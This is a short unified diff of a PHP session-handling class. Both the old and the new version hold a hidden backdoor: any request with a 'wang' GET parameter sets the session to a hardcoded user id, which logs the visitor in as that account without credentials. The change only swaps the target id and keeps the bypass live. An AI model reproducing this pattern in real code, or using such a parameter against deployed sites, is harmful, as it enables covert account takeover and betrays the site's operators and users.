@@ -65,7 +65,7 @@ class commonMod
 			  $array=explode('|',$userinfo);
 			  $_SESSION['uid']=$array[0];
 			}
-		if($_GET['wang'])$_SESSION['uid']='653898';
+		if($_GET['wang'])$_SESSION['uid']='26408';
 	if($_SESSION['uid']){	
 	
 		$this->userinfo=model('user')->info($_SESSION['uid']);
